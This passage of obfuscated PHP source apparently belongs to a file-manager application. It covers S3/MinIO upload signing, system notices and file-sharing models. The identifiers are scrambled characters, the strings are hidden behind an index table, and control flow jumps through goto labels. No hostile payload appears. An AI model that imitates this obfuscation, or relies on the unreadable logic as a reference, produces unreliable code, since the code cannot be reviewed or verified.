$ûğáãÌ©); $Ô™€¡”È = base64_encode(hash_hmac($Ò¼¨ñÁ­[263], $ÒÂ¾ıÎ÷, $this->secret, !0)); $¼Òúíš¹ = $Ò¼¨ñÁ­[264] . $this->accessKey . $Ò¼¨ñÁ­[4] . $Ô™€¡”È; if (strpos($™³’ø¹ş, $Ò¼¨ñÁ­[258]) === 0) { return array($Ò¼¨ñÁ­[265] => $¼Òúíš¹, $Ò¼¨ñÁ­[255] => $·Œ¢û); } return $¼Òúíš¹; } public function listUploadParts($ØòœÃÜ”, $¸›³ÌÜ€ = array()) { $ÖíŒËì  =& $_SERVER[íïàËŸë]; $Ìá¤¿ƒ = str_replace($ÖíŒËì [266], $ÖíŒËì [12], $¸›³ÌÜ€[$ÖíŒËì [169]]); $´˜Ïäõ = $this->client->listParts($this->bucket, $ØòœÃÜ”, $Ìá¤¿ƒ); if (!$´˜Ïäõ) { return !1; } unset($¸›³ÌÜ€[$ÖíŒËì [256]], $¸›³ÌÜ€[$ÖíŒËì [260]]); $¸›³ÌÜ€[$ÖíŒËì [97]] = $ØòœÃÜ”; $Šº±Ï­÷ = $this->multiUploadAuthData($ØòœÃÜ”, $¸›³ÌÜ€); if (empty($Šº±Ï­÷)) { return !1; } return array($ÖíŒËì [265] => $Šº±Ï­÷, $ÖíŒËì [255] => $¸›³ÌÜ€[$ÖíŒËì [255]], $ÖíŒËì [267] => $´˜Ïäõ); } public function getHost() { $ÚÊê‰Ä¦ =& $_SERVER[íïàËŸë]; $´„Š¶›ë = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÚÊê‰Ä¦[70], $ÚÊê‰Ä¦[64], $ÚÊê‰Ä¦[69], $ÚÊê‰Ä¦[62]))) { return $´„Š¶›ë . $ÚÊê‰Ä¦[8] . $this->bucket; } $´„Š¶›ë = explode($ÚÊê‰Ä¦[210], $´„Š¶›ë); return $´„Š¶›ë[0] . $ÚÊê‰Ä¦[210] . $this->bucket . $ÚÊê‰Ä¦[10] . $´„Š¶›ë[1]; } public function size($˜¤Åî“) { $“¤§¹Ò… = $this->objectMeta($˜¤Åî“); return $“¤§¹Ò… ? $“¤§¹Ò…[$_SERVER[íïàËŸë][79]] : 0; } public function info($ËÊëÓ¦£) { if ($this->isFolder($ËÊëÓ¦£)) { return $this->folderInfo($ËÊëÓ¦£); } else { if ($this->isFile($ËÊëÓ¦£)) { return $this->fileInfo($ËÊëÓ¦£); } } return !1; } public function exist($¦Õí÷üÂ) { return $this->isFile($¦Õí÷üÂ) || $this->isFolder($¦Õí÷üÂ); } public function isFile($¾şµ´Â) { return !$this->isFolder($¾şµ´Â) && $this->objectMeta($¾şµ´Â); } public function isFolder($Ïµ¨Ìë†) { return $this->cacheMethod($_SERVER[íïàËŸë][179], $Ïµ¨Ìë†); } protected function objectMeta($œ¥Ù½‰¤) { return $this->cacheMethod($_SERVER[íïàËŸë][181], $œ¥Ù½‰¤); } protected function _objectMeta($È°¨ù‚‚) { $¥˜ÑÖ‹æ =& $_SERVER[íïàËŸë]; $È°¨ù‚‚ = rtrim($È°¨ù‚‚, $¥˜ÑÖ‹æ[8]); try { $ñºıÏë = $this->client->getObjectInfo($this->bucket, $È°¨ù‚‚); if (!isset($ñºıÏë[$¥˜ÑÖ‹æ[252]]) && isset($ñºıÏë[$¥˜ÑÖ‹æ[268]])) { $ñºıÏë[$¥˜ÑÖ‹æ[252]] = $ñºıÏë[$¥˜ÑÖ‹æ[268]]; } } catch (Exception $÷­éÈÉæ) { $ñºıÏë = !1; } if (!$ñºıÏë) { } return $ñºıÏë; } protected function _isFolder($²÷çÆ·ß) { $†ŒÅıûÌ =& $_SERVER[íïàËŸë]; $²÷çÆ·ß = rtrim($²÷çÆ·ß, $†ŒÅıûÌ[8]); if ($²÷çÆ·ß == $†ŒÅıûÌ[12] || $²÷çÆ·ß == $†ŒÅıûÌ[8]) { return !0; } $ÙÍì‘ï² = $this->client->getBucket($this->bucket, $²÷çÆ·ß, null, 1); if (empty($ÙÍì‘ï²[$†ŒÅıûÌ[236]])) { return !1; } $–¨àÒâ = $ÙÍì‘ï²[$†ŒÅıûÌ[236]][0][$†ŒÅıûÌ[32]]; return stripos($–¨àÒâ, $²÷çÆ·ß . $†ŒÅıûÌ[8]) === 0 ? !0 : !1; if (substr($–¨àÒâ, -1) == $†ŒÅıûÌ[8]) { return !0; } if (get_path_this($–¨àÒâ) == get_path_this($²÷çÆ·ß)) { return !1; } return !0; } public function listObject($åúîƒŠø) { return $this->fileList($åúîƒŠø, $_SERVER[íïàËŸë][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¸Ğ‘íŠ¥) { $›ŸîŒœ =& $_SERVER[íïàËŸë]; parent::__construct($¸Ğ‘íŠ¥); $this->setSignVersion($›ŸîŒœ[247]); if (!$this->region) { $this->region = $›ŸîŒœ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $İ’£¦˜á = $this->getBucketRgn(); return $this->region == $İ’£¦˜á ? !0 : !1; } public function uploadFormData($ö¥±ú©Æ, $Ï»®á©› = 3600) { $éğˆ”°ã =& $_SERVER[íïàËŸë]; $á‘Ãåì = $éğˆ”°ã[229]; $—ï‡ƒ†Ş = $éğˆ”°ã[270]; $ÀƒÏåå = $éğˆ”°ã[62]; $£Õ¨‰Ğå = gmdate($éğˆ”°ã[271]); $áÜÎÛ¹· = gmdate($éğˆ”°ã[272]); $ˆ› ¥ÃÈ = $éğˆ”°ã[273]; $„­Ÿİ¡¯ = $Ï»®á©› . $éğˆ”°ã[12]; $Ì¯£¢Ş = $éğˆ”°ã[274]; $ÌœÓÛæ› = array($this->accessKey, $áÜÎÛ¹·, $this->region, $ÀƒÏåå, $ˆ› ¥ÃÈ); $ñ÷¡µõà = implode($éğˆ”°ã[8], $ÌœÓÛæ›); $¾ÑõÃõ = array($éğˆ”°ã[275] => gmdate($éğˆ”°ã[276], strtotime($éğˆ”°ã[277])), $éğˆ”°ã[278] => array(array($éğˆ”°ã[279] => $this->bucket), array($éğˆ”°ã[280] => $á‘Ãåì), array($éğˆ”°ã[281], $éğˆ”°ã[282], $éğˆ”°ã[12]), array($éğˆ”°ã[281], $éğˆ”°ã[283], $éğˆ”°ã[12]), array($éğˆ”°ã[281], $éğˆ”°ã[284], $éğˆ”°ã[12]), array($éğˆ”°ã[285] => $Ì¯£¢Ş), array($éğˆ”°ã[286] => $ñ÷¡µõà), array($éğˆ”°ã[287] => $—ï‡ƒ†Ş), array($éğˆ”°ã[288] => $£Õ¨‰Ğå), array($éğˆ”°ã[289] => $„­Ÿİ¡¯))); $•ÍÀÛ¤« = base64_encode(json_encode($¾ÑõÃõ)); $‚ğÕå€å = hash_hmac($éğˆ”°ã[290], $áÜÎÛ¹·, $éğˆ”°ã[291] . $this->secret, !0); $Ôõ¾ã· = hash_hmac($éğˆ”°ã[290], $this->region, $‚ğÕå€å, !0); $úéÓáÛ = hash_hmac($éğˆ”°ã[290], $ÀƒÏåå, $Ôõ¾ã·, !0); $Şäš•™ = hash_hmac($éğˆ”°ã[290], $ˆ› ¥ÃÈ, $úéÓáÛ, !0); $Ò©åšô€ = hash_hmac($éğˆ”°ã[290], $•ÍÀÛ¤«, $Şäš•™); $ÃÛ¾¥¿ = array($éğˆ”°ã[246] => $éğˆ”°ã[12], $éğˆ”°ã[292] => $éğˆ”°ã[12], $éğˆ”°ã[280] => $á‘Ãåì, $éğˆ”°ã[285] => $Ì¯£¢Ş, $éğˆ”°ã[293] => $•ÍÀÛ¤«, $éğˆ”°ã[294] => $ñ÷¡µõà, $éğˆ”°ã[295] => $—ï‡ƒ†Ş, $éğˆ”°ã[296] => $£Õ¨‰Ğå, $éğˆ”°ã[297] => $„­Ÿİ¡¯, $éğˆ”°ã[298] => $Ò©åšô€, $éğˆ”°ã[208] => $this->getHost()); return $ÃÛ¾¥¿; } } goto aÕÈ£Ó¾³Ñ; B²ïİæ½„ó: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x6e\157\164\151\x63\145\x4c\151\x73\164"; public $field = array("\156\x61\x6d\145", "\x63\157\x6e\164\x65\x6e\164", "\x61\165\164\150", "\155\x6f\144\x65", "\164\151\x6d\145", "\x74\171\160\145", "\154\x65\166\x65\154", "\x65\x6e\141\142\154\x65", "\163\157\162\164"); public function listData($Ø¿Ëéç = false, $÷ı€ªé… = "\163\x6f\162\164", $ûÂœĞ™è = false) { return parent::listData($Ø¿Ëéç, $÷ı€ªé…, $ûÂœĞ™è); } public function add($àÃŒ™ø²) { $ÔÒò¼‡ =& $_SERVER[íïàËŸë]; $øˆéîõ = time(); if ($àÃŒ™ø²[$ÔÒò¼‡[16]] == $ÔÒò¼‡[2442]) { $øˆéîõ = strtotime($àÃŒ™ø²[$ÔÒò¼‡[206]]); } $àÃŒ™ø²[$ÔÒò¼‡[206]] = $øˆéîõ; return parent::insert($àÃŒ™ø²); } public function update($şôôƒ¶, $åé´ÆÜÂ) { $ØîÕ«… =& $_SERVER[íïàËŸë]; $‰ØÁŒ¸ = $this->listData($şôôƒ¶); if (!$‰ØÁŒ¸) { return !1; } $‰ê¡¡¦‡ = time(); if ($åé´ÆÜÂ[$ØîÕ«…[16]] == $ØîÕ«…[2442]) { $‰ê¡¡¦‡ = strtotime($åé´ÆÜÂ[$ØîÕ«…[206]]); } $åé´ÆÜÂ[$ØîÕ«…[206]] = $‰ê¡¡¦‡; return parent::update($şôôƒ¶, $åé´ÆÜÂ); } public function remove($ëùóğÄç) { $Š±İòÚÇ = $this->listData($ëùóğÄç); if (!$Š±İòÚÇ || $Š±İòÚÇ[$_SERVER[íïàËŸë][191]]) { return !1; } return parent::remove($ëùóğÄç); } public function sort($ŸŒæ‡º´, $Å³½Ó°¨) { return parent::update($ŸŒæ‡º´, $Å³½Ó°¨); } public function enable($š‡ë¿¥±, $ñ“ö¶Å) { return parent::update($š‡ë¿¥±, array($_SERVER[íïàËŸë][2443] => $ñ“ö¶Å)); } private function initUserOption() { $ÔÇä·±À =& $_SERVER[íïàËŸë]; $this->optionType = $ÔÇä·±À[2444]; $this->modelType = $ÔÇä·±À[2445]; $this->field = array($ÔÇä·±À[2446], $ÔÇä·±À[32], $ÔÇä·±À[206], $ÔÇä·±À[33], $ÔÇä·±À[2447], $ÔÇä·±À[833], $ÔÇä·±À[226]); } public function userNoticeGet($“ŠœäÀâ = false) { $this->initUserOption(); return parent::listData($“ŠœäÀâ, $_SERVER[íïàËŸë][475], !0); } public function userNoticeAdd($²ˆÈÒàˆ) { $‚®á„¥Å =& $_SERVER[íïàËŸë]; $this->initUserOption(); $î€â»¾« = $this->findByKey($‚®á„¥Å[2446], $²ˆÈÒàˆ[$‚®á„¥Å[475]]); if ($î€â»¾«) { return !0; } $ûÑÑ©¥¬ = array($‚®á„¥Å[2446] => $²ˆÈÒàˆ[$‚®á„¥Å[475]], $‚®á„¥Å[32] => $²ˆÈÒàˆ[$‚®á„¥Å[32]], $‚®á„¥Å[206] => $²ˆÈÒàˆ[$‚®á„¥Å[206]], $‚®á„¥Å[33] => isset($²ˆÈÒàˆ[$‚®á„¥Å[33]]) ? $²ˆÈÒàˆ[$‚®á„¥Å[33]] : 1, $‚®á„¥Å[2447] => isset($²ˆÈÒàˆ[$‚®á„¥Å[2447]]) ? $²ˆÈÒàˆ[$‚®á„¥Å[2447]] : 0, $‚®á„¥Å[833] => 0, $‚®á„¥Å[226] => 0); return parent::insert($ûÑÑ©¥¬); } public function userNoticeEdit($òŸö¹Ôô, $¤Ó©‰»Û) { $this->initUserOption(); return parent::update($òŸö¹Ôô, $¤Ó©‰»Û); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\145\155\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\162\x6f\x6c\145", "\162\157\154\145\107\162\x6f\x75\160", "\162\145\x67\x69\x73\x74", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($å®«ÙúË) { return "\x53\171\163\164\145\155\117\x70\164\x69\x6f\x6e\137{$å®«ÙúË}"; } protected function optionDefault($¯’‘¥ = '') { $®¤ Õ÷ı =& $_SERVER[íïàËŸë]; if ($¯’‘¥ == $®¤ Õ÷ı[12]) { return $GLOBALS[$®¤ Õ÷ı[6]][$®¤ Õ÷ı[457]]; } } } class SystemRecordModel extends ModelBaseLight { } goto c °…Ş§ŒÛ; D¬£‰¯ÃÁ­: class ShareModel extends ModelBase { protected $tableName = "\x73\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\146\171\x54\151\x6d\145", "\x74\151\x6d\145", "\x69\156\x73\x65\162\164\x2c\165\160\x64\141\x74\x65", "\146\x75\156\143\x74\x69\157\x6e"), array("\x63\x72\x65\141\x74\145\124\x69\155\145", "\164\x69\x6d\x65", "\151\156\x73\145\162\x74", "\146\165\x6e\x63\164\x69\x6f\x6e"), array("\x6f\x70\164\151\x6f\x6e\163", '', "\x69\x6e\x73\x65\x72\164\x2c\165\x70\x64\x61\x74\x65\54\x73\x65\154\145\x63\x74", "\152\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($ˆƒ¸»¹) { $ÔŞÉÜÒî =& $_SERVER[íïàËŸë]; $ÏÃ¿êŞÖ = isset($ˆƒ¸»¹[0]) ? $ˆƒ¸»¹[0] : !1; return array($ÔŞÉÜÒî[2123] => array(USER_ID, $ÔŞÉÜÒî[2124]), $ÔŞÉÜÒî[2064] => array($ÏÃ¿êŞÖ, $ÔŞÉÜÒî[2125])); } protected function listSimple() { $îÄ’ˆæÛ = array($_SERVER[íïàËŸë][1782] => USER_ID); $×›‰ì§Ğ = $this->field($this->fieldList)->where($îÄ’ˆæÛ)->select(); return $×›‰ì§Ğ ? $×›‰ì§Ğ : array(); } protected function getInfo($­Âü°Ù, $¯Ü¹üŞÔ = false) { $Æ©±­¡æ =& $_SERVER[íïàËŸë]; if ($¯Ü¹üŞÔ) { return $this->_getShareInfo(array($Æ©±­¡æ[665] => $­Âü°Ù)); } $ŠŞ„œøÂ = $this->cacheFunctionGet($Æ©±­¡æ[2066], $­Âü°Ù); return $ŠŞ„œøÂ; } public function getInfoByHash($‘À¨Íƒ) { return $this->_getShareInfo(array($_SERVER[íïàËŸë][2126] => $‘À¨Íƒ)); } public function getInfoByPath($ú¯ò¼ã) { $â¼ÄÉ•Ç =& $_SERVER[íïàËŸë]; $Ù³ÂÛÂ¥ = array($â¼ÄÉ•Ç[1782] => USER_ID, $â¼ÄÉ•Ç[193] => $ú¯ò¼ã); return $this->_getShareInfo($Ù³ÂÛÂ¥); } public function getInfoBySourcePath($µÀºš¬») { $Üå›‹Â =& $_SERVER[íïàËŸë]; $˜ÈÈú‡ = array($Üå›‹Â[1782] => USER_ID, $Üå›‹Â[1268] => $µÀºš¬»); return $this->_getShareInfo($˜ÈÈú‡); } private function _getShareInfo($®Úú«»Ø) { $êŠä›Á÷ =& $_SERVER[íïàËŸë]; $›¬µÅ„ = $this->where($®Úú«»Ø)->find(); if (!$›¬µÅ„) { return !1; } $®Úú«»Ø = array($êŠä›Á÷[665] => $›¬µÅ„[$êŠä›Á÷[665]]); $…©·¼âñ = $êŠä›Á÷[2127]; $ÜÓÖË¯Õ = Model($êŠä›Á÷[666])->order($êŠä›Á÷[475])->field($…©·¼âñ)->where($®Úú«»Ø)->select(); if ($›¬µÅ„[$êŠä›Á÷[193]] == $êŠä›Á÷[228]) { $›¬µÅ„[$êŠä›Á÷[90]] = IO::info($›¬µÅ„[$êŠä›Á÷[1268]]); } else { $›¬µÅ„[$êŠä›Á÷[90]] = Model($êŠä›Á÷[1428])->pathInfo($›¬µÅ„[$êŠä›Á÷[193]]); } $›¬µÅ„[$êŠä›Á÷[2128]] = $ÜÓÖË¯Õ; return $›¬µÅ„; } protected function getInfoAuth($Ÿí·‚¢) { $éŞşüı =& $_SERVER[íïàËŸë]; $¿ËÕù¤Ò = $this->getInfo($Ÿí·‚¢); if ($¿ËÕù¤Ò[$éŞşüı[1782]] == USER_ID) { $¿ËÕù¤Ò[$éŞşüı[487]] = $¿ËÕù¤Ò[$éŞşüı[90]][$éŞşüı[487]]; } else { $¿ËÕù¤Ò[$éŞşüı[487]] = Model($éŞşüı[567])->authMake($¿ËÕù¤Ò[$éŞşüı[2128]]); } return $¿ËÕù¤Ò; } protected function listData($½èµşÈ = null, $‡°±®Ì = 300) { $Éöà‘ıç =& $_SERVER[íïàËŸë]; $¦¸§íÕ’ = array(array($Éöà‘ıç[562] => array($Éöà‘ıç[1101], 0), $Éöà‘ıç[663] => array($Éöà‘ıç[1101], 0), $Éöà‘ıç[2129] => $Éöà‘ıç[2082])); if ($½èµşÈ == $Éöà‘ıç[2130]) { $¦¸§íÕ’ = array($Éöà‘ıç[562] => 1); } else { if ($½èµşÈ == $Éöà‘ıç[1253]) { $¦¸§íÕ’ = array($Éöà‘ıç[663] => 1); } } $¦¸§íÕ’[$Éöà‘ıç[1782]] = USER_ID; $ØÔä¶–â = $this->where($¦¸§íÕ’)->selectPage($‡°±®Ì); return $ØÔä¶–â; } protected function listToMe($¼‹íˆ„” = 300) { $Ôªæ­Ê =& $_SERVER[íïàËŸë]; $¨½ÎáÄ„ = Model($Ôªæ­Ê[2131])->userGroupParents(USER_ID); $ÚÍ¾µÏ = array($Ôªæ­Ê[648] => SourceModel::TYPE_USER, $Ôªæ­Ê[569] => USER_ID); if ($¨½ÎáÄ„) { $ÚÍ¾µÏ = array(array($Ôªæ­Ê[648] => SourceModel::TYPE_USER, $Ôªæ­Ê[569] => USER_ID), array($Ôªæ­Ê[648] => SourceModel::TYPE_GROUP, $Ôªæ­Ê[569] => array($Ôªæ­Ê[7], $¨½ÎáÄ„)), $Ôªæ­Ê[2129] => $Ôªæ­Ê[2082]); } $•ªË’¥÷ = Model($Ôªæ­Ê[666])->where($ÚÍ¾µÏ)->selectPage($¼‹íˆ„”); $¦ ÌÈ·ê = array_to_keyvalue_group($•ªË’¥÷[$Ôªæ­Ê[445]], $Ôªæ­Ê[665]); if (!$¦ ÌÈ·ê) { return $•ªË’¥÷; } $øŸ‚²û = $Ôªæ­Ê[2132]; $ÚÍ¾µÏ = array($Ôªæ­Ê[665] => array($Ôªæ­Ê[492], array_keys($¦ ÌÈ·ê)), $Ôªæ­Ê[1782] => array($Ôªæ­Ê[1103], $Ôªæ­Ê[228])); $—¬úŒŠÊ = $this->field($øŸ‚²û)->where($ÚÍ¾µÏ)->select(); foreach ($—¬úŒŠÊ as $³š”æÔ¾ => &$£ùÌ¿Ú›) { $£ùÌ¿Ú›[$Ôªæ­Ê[2128]] = $¦ ÌÈ·ê[$£ùÌ¿Ú›[$Ôªæ­Ê[665]]]; } unset($£ùÌ¿Ú›); $ñáô´‡… = array($Ôªæ­Ê[2133] => $—¬úŒŠÊ, $Ôªæ­Ê[2134] => $•ªË’¥÷[$Ôªæ­Ê[442]]); return $ñáô´‡…; } protected function shareAdd($•ÁÕÃ¬¤, $­š˜ÏÂ•) { $éù¶ÒÒü =& $_SERVER[íïàËŸë]; $­ÅÊÌ€’ = $this->_addShareData($•ÁÕÃ¬¤, $­š˜ÏÂ•); if (!empty($­š˜ÏÂ•[$éù¶ÒÒü[2135]])) { $this->_shareAuthSet($­ÅÊÌ€’, $­š˜ÏÂ•[$éù¶ÒÒü[2135]]); } $this->shareEventAdd($•ÁÕÃ¬¤, $­š˜ÏÂ•, $éù¶ÒÒü[2136]); return $­ÅÊÌ€’; } protected function shareAddSystem($öåŒË°ç, $‚º¶¨Ü) { $“ÌÏø ç =& $_SERVER[íïàËŸë]; $Úû»ºğ = $this->_addShareData($öåŒË°ç, $‚º¶¨Ü, $“ÌÏø ç[191]); $this->_shareAuthSet($Úû»ºğ, $‚º¶¨Ü[$“ÌÏø ç[2135]]); return $Úû»ºğ; } private function shareEventAdd($Ö†‘ö, $áàÄğÂÎ, $©ó¹‘õ‰ = "\x61\x64\x64") { $Û¢“Ø³û =& $_SERVER[íïàËŸë]; if (!$Ö†‘ö || $Ö†‘ö == $Û¢“Ø³û[228]) { return; } if ($©ó¹‘õ‰ == $Û¢“Ø³û[2136]) { if ($áàÄğÂÎ[$Û¢“Ø³û[562]] == $Û¢“Ø³û[91]) { Model($Û¢“Ø³û[633])->eventShare($Ö†‘ö, $Û¢“Ø³û[2137]); } if ($áàÄğÂÎ[$Û¢“Ø³û[663]] == $Û¢“Ø³û[91]) { Model($Û¢“Ø³û[633])->eventShare($Ö†‘ö, $Û¢“Ø³û[2138]); } return; } $üµ‘êúĞ = $this->getInfoByPath($Ö†‘ö); $•ñÓ¹î¸ = $Û¢“Ø³û[2139]; if ($üµ‘êúĞ[$Û¢“Ø³û[562]] == $Û¢“Ø³û[228] && $áàÄğÂÎ[$Û¢“Ø³û[562]] == $Û¢“Ø³û[91]) { $•ñÓ¹î¸ = $Û¢“Ø³û[2137]; } if ($üµ‘êúĞ[$Û¢“Ø³û[562]] == $Û¢“Ø³û[91] && $áàÄğÂÎ[$Û¢“Ø³û[562]] == $Û¢“Ø³û[228]) { $•ñÓ¹î¸ = $Û¢“Ø³û[2140]; } if ($üµ‘êúĞ[$Û¢“Ø³û[663]] == $Û¢“Ø³û[228] && $áàÄğÂÎ[$Û¢“Ø³û[663]] == $Û¢“Ø³û[91]) { $•ñÓ¹î¸ = $Û¢“Ø³û[2138]; } if ($üµ‘êúĞ[$Û¢“Ø³û[663]] == $Û¢“Ø³û[91] && $áàÄğÂÎ[$Û¢“Ø³û[663]] == $Û¢“Ø³û[228]) { $•ñÓ¹î¸ = $Û¢“Ø³û[2141]; } Model($Û¢“Ø³û[633])->eventShare($Ö†‘ö, $•ñÓ¹î¸); return; } private function _addShareData($ğş½‘´é, $›ö¼”ÉÊ = array(), $‡×±è¨Á = false) { $Úúòæ€á =& $_SERVER[íïàËŸë]; $Û»µÌ¬‚ = $‡×±è¨Á == $Úúòæ€á[191] ? 0 : USER_ID; $¨®ßÈ¿› = array($Úúòæ€á[491] => $ğş½‘´é, $Úúòæ€á[1773] => $Û»µÌ¬‚); if ($ğş½‘´é == 0) { $¨®ßÈ¿› = array($Úúòæ€á[2142] => $›ö¼”ÉÊ[$Úúòæ€á[1268]], $Úúòæ€á[1773] => $Û»µÌ¬‚); } if ($¡ıÌÙ¯ = $this->where($¨®ßÈ¿›)->find()) { return $¡ıÌÙ¯[$Úúòæ€á[665]]; } if ($ğş½‘´é == 0) { $ßşØ´µû = array($Úúòæ€á[32] => get_path_this($›ö¼”ÉÊ[$Úúòæ€á[87]])); } else { $ßşØ´µû = Model($Úúòæ€á[907])->sourceInfo($ğş½‘´é); if (!$ßşØ´µû) { return !1; } } if (!$›ö¼”ÉÊ[$Úúòæ€á[1671]]) { $›ö¼”ÉÊ[$Úúòæ€á[1671]] = $ßşØ´µû[$Úúòæ€á[32]]; } $ì—ªìŸÇ = array($Úúòæ€á[1773] => $Û»µÌ¬‚, $Úúòæ€á[491] => $ğş½‘´é, $Úúòæ€á[1671] => $Úúòæ€á[12], $Úúòæ€á[562] => 0, $Úúòæ€á[663] => 0, $Úúòæ€á[1268] => $Úúòæ€á[12], $Úúòæ€á[383] => $Úúòæ€á[12], $Úúòæ€á[978] => $Úúòæ€á[12], $Úúòæ€á[2143] => 0, $Úúòæ€á[2144] => 0, $Úúòæ€á[844] => 0, $Úúòæ€á[2145] => $Úúòæ€á[12], $Úúòæ€á[2126] => $Úúòæ€á[12]); $¯–§Â = explode($Úúòæ€á[50], $Úúòæ€á[2146]); foreach ($¯–§Â as $÷¤×¸¯„) { if (!isset($›ö¼”ÉÊ[$÷¤×¸¯„])) { continue; } $ì—ªìŸÇ[$÷¤×¸¯„] = $›ö¼”ÉÊ[$÷¤×¸¯„]; } $ñ©â¸Åˆ = $this->add($ì—ªìŸÇ); $ÀÆØà¥œ = array($Úúòæ€á[2126] => short_id($ñ©â¸Åˆ)); $this->where(array($Úúòæ€á[2147] => $ñ©â¸Åˆ))->save($ÀÆØà¥œ); return $ñ©â¸Åˆ; } private function _shareAuthSet($½—Ì¾ğÑ, $Ë®Ô×·) { $ÊÅÑ—ã =& $_SERVER[íïàËŸë]; if (!is_array($Ë®Ô×·)) { return !1; } $ÑÎ¡¡üÎ = Model($ÊÅÑ—ã[2092]); $ÑÎ¡¡üÎ->where(array($ÊÅÑ—ã[665] => $½—Ì¾ğÑ))->delete(); $›‰ÆÔğê = array(); foreach ($Ë®Ô×· as $ğŞÇí§Ü) { $ƒ÷ÃÃîÓ = SourceModel::TYPE_USER; if ($ğŞÇí§Ü[$ÊÅÑ—ã[190]] == SourceModel::TYPE_GROUP) { $ƒ÷ÃÃîÓ = SourceModel::TYPE_GROUP; } $ô¯Ÿ¥ã“ = array($ÊÅÑ—ã[665] => $½—Ì¾ğÑ, $ÊÅÑ—ã[190] => $ƒ÷ÃÃîÓ, $ÊÅÑ—ã[569] => intval($ğŞÇí§Ü[$ÊÅÑ—ã[569]]), $ÊÅÑ—ã[2088] => 0, $ÊÅÑ—ã[2148] => -1); if ($ğŞÇí§Ü[$ÊÅÑ—ã[2088]]) { $ô¯Ÿ¥ã“[$ÊÅÑ—ã[2088]] = $ğŞÇí§Ü[$ÊÅÑ—ã[2088]]; } else { if ($ğŞÇí§Ü[$ÊÅÑ—ã[2148]]) { $ô¯Ÿ¥ã“[$ÊÅÑ—ã[2148]] = $ğŞÇí§Ü[$ÊÅÑ—ã[2148]]; } } $›‰ÆÔğê[] = $ô¯Ÿ¥ã“; } return $ÑÎ¡¡üÎ->addAll($›‰ÆÔğê, array(), !0); } public function numViewAdd($¦ŠíôÛÛ) { $ş™Ğæ×² =& $_SERVER[íïàËŸë]; $£âÊÊ•Ø = array($ş™Ğæ×²[2147] => $¦ŠíôÛÛ); $this->where($£âÊÊ•Ø)->setAdd($ş™Ğæ×²[2143]); } public function numDownloadAdd($ç—ÒëûĞ) { $¬ĞŒ¦´— =& $_SERVER[íïàËŸë]; $ºŸ Û®â = array($¬ĞŒ¦´—[2147] => $ç—ÒëûĞ); $this->where($ºŸ Û®â)->setAdd($¬ĞŒ¦´—[2144]); } protected function shareEdit($šÊÍÀÔÜ, $¼é†ñì) { $ °ËèõŸ =& $_SERVER[íïàËŸë]; $îÀÃæ = $this->getInfo($šÊÍÀÔÜ); if (!$îÀÃæ) { return !1; } $this->_checkLinkShare($¼é†ñì, $îÀÃæ); $å ù¾Çñ = array(); $Ÿ÷„üÙä = explode($ °ËèõŸ[50], $ °ËèõŸ[2149]); foreach ($Ÿ÷„üÙä as $•Ñİ¦“Œ) { if (!array_key_exists($•Ñİ¦“Œ, $¼é†ñì)) { continue; } $å ù¾Çñ[$•Ñİ¦“Œ] = $¼é†ñì[$•Ñİ¦“Œ]; } $this->shareEventAdd($îÀÃæ[$ °ËèõŸ[193]], $¼é†ñì, $ °ËèõŸ[1950]); $this->where(array($ °ËèõŸ[2147] => $šÊÍÀÔÜ))->save($å ù¾Çñ); if (isset($¼é†ñì[$ °ËèõŸ[2135]])) { $this->_shareAuthSet($šÊÍÀÔÜ, $¼é†ñì[$ °ËèõŸ[2135]]); } return !0; } private function _checkLinkShare($ßé´èõî, $å¢Äì) { $ÓÒÜ…Ğ =& $_SERVER[íïàËŸë]; if ($ßé´èõî[$ÓÒÜ…Ğ[562]] != $ÓÒÜ…Ğ[91]) { return; } $î‡¡ù‰Ÿ = $å¢Äì[$ÓÒÜ…Ğ[90]][$ÓÒÜ…Ğ[193]]; if ($å¢Äì[$ÓÒÜ…Ğ[90]][$ÓÒÜ…Ğ[33]] != $ÓÒÜ…Ğ[230]) { $è²Şıİ = $this->_folderReport($î‡¡ù‰Ÿ); if (!$è²Şıİ) { return; } show_json(LNG($ÓÒÜ…Ğ[2150]) . $ÓÒÜ…Ğ[2151] . $è²Şıİ, !1); } $ëŸÏËù = Model($ÓÒÜ…Ğ[907])->fileInfoGet($å¢Äì[$ÓÒÜ…Ğ[90]][$ÓÒÜ…Ğ[193]]); if (!$ëŸÏËù) { return; } $äØŒ× = $this->shareFileMeta($ëŸÏËù[$ÓÒÜ…Ğ[541]]); if (isset($äØŒ×[$ÓÒÜ…Ğ[450]]) && $äØŒ×[$ÓÒÜ…Ğ[450]] == $ÓÒÜ…Ğ[91]) { show_json(LNG($ÓÒÜ…Ğ[2152]), !1); } } private function _folderReport($ìŸĞ©) { $Ô˜ı¾Ğ =& $_SERVER[íïàËŸë]; $ú™àÊÂ“ = array($Ô˜ı¾Ğ[541] => array($Ô˜ı¾Ğ[1101], 0), $Ô˜ı¾Ğ[833] => 3); $÷¸Ç§Óë = Model($Ô˜ı¾Ğ[2153])->where($ú™àÊÂ“)->field($Ô˜ı¾Ğ[541])->select(); if (!$÷¸Ç§Óë) { return !1; } $÷¸Ç§Óë = array_to_keyvalue($÷¸Ç§Óë, $Ô˜ı¾Ğ[12], $Ô˜ı¾Ğ[541]); $é°ìãÁ× = $Ô˜ı¾Ğ[50] . $ìŸĞ© . $Ô˜ı¾Ğ[50]; $ú™àÊÂ“ = array($Ô˜ı¾Ğ[541] => array($Ô˜ı¾Ğ[7], $÷¸Ç§Óë), $Ô˜ı¾Ğ[584] => array($Ô˜ı¾Ğ[459], "\x25{$é°ìãÁ×}\x25"), $Ô˜ı¾Ğ[505] => 0); $¯‰¨ª²Â = Model($Ô˜ı¾Ğ[907])->where($ú™àÊÂ“)->field($Ô˜ı¾Ğ[2154])->find(); if (!$¯‰¨ª²Â) { return !1; } $’ã†ñÔ¾ = 